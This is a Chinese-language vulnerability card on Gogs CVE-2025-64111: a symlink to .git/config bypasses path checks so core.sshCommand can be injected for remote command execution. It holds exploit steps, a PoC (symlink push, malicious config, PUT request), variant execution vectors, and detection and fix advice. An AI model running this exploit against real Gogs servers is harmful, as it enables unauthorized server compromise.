---
id: web-golang-gogs-updaterepofile-symlink-git-config-rce
title: Gogs UpdateRepoFile 符号链接绕过 .git 校验写入 core.sshCommand 导致 RCE（CVE-2025-64111）
type: scenario
domain: web
path: web/golang
technique: gogs-updaterepofile-symlink-git-config-rce
aliases:
- CVE-2025-64111
- Gogs .git/config RCE
- core.sshCommand 注入
- isRepositoryGitPath 绕过
- UpdateRepoFile 符号链接
- CVE-2024-56731 补丁绕过
tags:
- go
- gogs
- git
- symlink
- path-validation
- rce
- cve-2025-64111
- authenticated
cve:
- CVE-2025-64111
- CVE-2024-56731
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Gogs ≤0.13.3（原文：修复版本 0.13.4、0.14.0+dev）
verification:
  verified_by: verifier-V33
  verified_at: '2026-11-05T06:02:55+08:00'
  notes: 已对照原文与4张截图核对：PutContents treePath=pathutil.Clean、OldTreeName/NewTreeName 同值传入 UpdateRepoFile、仅校验 NewTreeName、isRepositoryGitPath 静态字符串匹配（ToLower 后 HasSuffix .git/.git.、Contains .git/、.git\、.git./、.git.\）均与截图一致；CVE-2025-64111 与受影响 ≤0.13.3/修复 0.13.4、0.14.0+dev 与原文一致；原文未展示 /tmp/abc 执行截图，最终触发依赖后续 Git SSH 操作，卡内已注明；未在本机复现
---

## 一句话结论

Gogs ≤0.13.3 的 `UpdateRepoFile` 只用静态字符串函数 `isRepositoryGitPath` 检查 `NewTreeName`，且遗漏 `OldTreeName`；拥有仓库写权限的用户可先推送一个内容为 `link -> .git/config` 的符号链接，再调用 `PUT /api/v1/repos/:owner/:repo/contents/link` 把恶意内容写入 `link`，操作系统跟随符号链接改写 `.git/config`，注入 `core.sshCommand`，之后 Gogs 对该仓库执行 Git SSH 操作时即触发服务器命令执行。

## 原理

- CVE-2024-56731 的根因是 Gogs 的文件操作 API（`UploadRepoFiles`、`DeleteRepoFile`、`UpdateRepoFile` 等）缺少 `.git` 目录校验，攻击者可直接改写 `.git/config` 等仓库内部文件。
- Gogs 的补丁在 `UpdateRepoFile` 中加入 `isRepositoryGitPath(opts.NewTreeName)` 检查，但：
  1. 只检查 `NewTreeName`，没有检查 `OldTreeName`；在“重命名/移动 + 修改内容”场景下，函数会以 `OldTreeName` 定位源文件，攻击者可让源路径指向 `.git` 内部而 `NewTreeName` 保持合法。
  2. `isRepositoryGitPath` 是纯静态字符串匹配：`strings.ToLower(path)` 后判断后缀 `.git`、`.git.`，或包含 `.git/`、`.git\`、`.git./`、`.git.\`。它不调用 `filepath.EvalSymlinks`/`os.Lstat`，无法识别“路径字符串不含 `.git`、但实际指向 `.git`”的符号链接。
- 利用链：
  - 攻击者在本地仓库创建符号链接 `link -> .git/config`，提交并 push 到 Gogs。Git 会把它作为 symlink 条目存入仓库；Gogs 的 API 路径 `contents/link` 的字符串是 `link`，`isRepositoryGitPath("link")` 返回 false，检查通过。
  - `PutContents` 中 `treePath := pathutil.Clean(c.Params("*"))`，并把 `OldTreeName`、`NewTreeName` 都设为 `treePath`；`UpdateRepoFile` 通过 Git 索引/工作区写入该路径。文件写入按普通路径打开，操作系统跟随符号链接，实际写入 `.git/config`。
  - 写入的 `.git/config` 包含 `[core] sshCommand = <命令>`。Git 在使用 SSH 传输（`git pull`/`push`/`fetch`，或 Gogs 的镜像同步等）时会直接执行 `core.sshCommand`，命令以 Gogs 进程用户身份运行。
- 危害放大因子是 Git 自身的配置语义：`core.sshCommand` 设计上就是让用户指定 SSH 命令，Git 不做过滤；因此只要能改写仓库 config，就能把任意命令挂到下一次 Git SSH 操作上。

## 触发条件

- Gogs 版本 ≤0.13.3（修复版本 0.13.4、0.14.0+dev）。
- 攻击者拥有一个可写仓库（能 push 符号链接）及带仓库写权限的 API token；普通注册用户创建自己的仓库即可满足。
- Gogs 允许仓库中存在符号链接（Git 支持 symlink 条目，Gogs 未拒绝）。
- 服务器会对该仓库执行 Git SSH 操作：如镜像仓库同步、`git pull/push/fetch`、或用户/定时任务触发的仓库同步；没有后续 Git SSH 操作时，恶意配置只是写入，尚未执行。
- Gogs 进程用户可执行目标命令（通常为低权限服务账号）。

## 利用步骤

1. 在本地 clone/创建攻击者可写的仓库，创建指向 `.git/config` 的符号链接并推送：
   ```bash
   ln -s .git/config link
   git add link
   git commit -m 'add link'
   git push
   ```
2. 构造恶意 `.git/config`：保留必要的仓库配置字段，加入 `sshCommand = <命令>`（原文示例 `touch /tmp/abc`，可换反弹 shell）。
3. 将 config 内容 base64 编码。
4. 调用 Gogs API 修改 `link`：
   `PUT /api/v1/repos/<owner>/<repo>/contents/link`，JSON 中 `content` 为上述 base64，`Authorization: token <token>`。
5. `PutContents` → `UpdateRepoFile` 检查 `link` 通过 → 写入跟随符号链接到 `.git/config`。
6. 触发该仓库的 Git SSH 操作（Gogs 镜像同步/拉取/推送），Git 解析 `core.sshCommand` 并执行；命令以 Gogs 服务用户身份运行。
7. 验证：检查 `/tmp/abc` 是否创建、或接收反弹 shell；也可在 `.git/config` 中写入带外带/回连的命令。

## PoC

```bash
# 1. 仓库内创建符号链接并推送
ln -s .git/config link
git add link
git commit -m 'add'
git push
```

```ini
# 2. 恶意 .git/config 内容（base64 后作为 content）
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
	sshCommand = touch /tmp/abc
[remote "origin"]
	url = ssh://git@localhost/demo/vul.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
```

```http
PUT /api/v1/repos/demo/vul/contents/link HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Authorization: token <token>

{"message":"message","committer":{"name":"test","email":"a@b.com"},"content":"<base64(config)>"}
```

```bash
# 3. 触发 Git SSH 操作后验证
ls -l /tmp/abc
```

## 变体与关联

- 变体：符号链接指向 `.git/hooks/*`、`.git/config` 之外的其他 Git 内部文件，或使用多层/相对符号链接绕过更严格的字符串检查；关键是校验路径与实际路径分离。
- 变体：利用 `OldTreeName` 未校验，在重命名/移动场景中让源路径指向 `.git` 内部文件，而 `NewTreeName` 使用合法路径。
- 变体：`core.sshCommand` 之外的 Git 配置执行面：`core.fsmonitor`、`core.hooksPath`、`diff.external`、`filter.*.clean/smudge` 等也可能在特定 Git 操作中执行命令，具体取决于 Git 版本与调用方式。
- 关联：[[web-generic-file-upload-gogs-lfs-oid-content-hash-cross-repo-overwrite]]（同产品 Gogs 的另一处仓库内容校验问题）；[[web-generic-file-inclusion-multilayer-symlink-realpath-bypass]]（符号链接绕过路径校验的通用思路）；[[pentest-privilege-escalation-suid-symlink-arbitrary-file-read]]（检查路径与实际路径不一致）。
- 边界：Gogs 已升级到 0.13.4/0.14.0+dev；或仓库禁止符号链接、写入前做了 `EvalSymlinks`/`Lstat` 校验、Git SSH 操作被禁用时，链不成立。原文 POC 未展示 `/tmp/abc` 的实际执行截图，最终触发依赖后续 Git SSH 操作。

## 检测与防御

- 检测：API 审计中出现对 `contents/<path>` 的 PUT，且目标路径是仓库中的符号链接；仓库内存在指向 `.git` 的 symlink 条目；`.git/config` 被非 Git 操作修改、出现 `sshCommand`/`fsmonitor`/`hooksPath` 等执行型配置；Gogs 进程发起 `git` 后又启动 `sh -c`/`touch`/`nc` 等子进程。
- 修复：升级到 0.13.4/0.14.0+dev；在 `UpdateRepoFile` 中对 `OldTreeName` 和 `NewTreeName` 都做校验；写入前用 `filepath.EvalSymlinks` 解析真实路径并确认不在 `.git` 内，或用 `os.Lstat` 拒绝符号链接（必要时 `O_NOFOLLOW`/`openat`）。
- 加固：仓库文件写入使用临时文件 + 原子 rename，避免跟随既有链接；禁止/过滤仓库中的符号链接文件；对 Gogs 执行的 Git 操作禁用仓库级危险配置（如覆盖 `core.sshCommand`、`core.fsmonitor`、`core.hooksPath`）；Gogs 以低权限账号运行，限制其可执行命令与网络。
- 检测补充：对 `.git/config` 做文件完整性监控；监控 Gogs 服务账号的进程树与异常命令；限制仓库创建/推送权限，审计 API token。
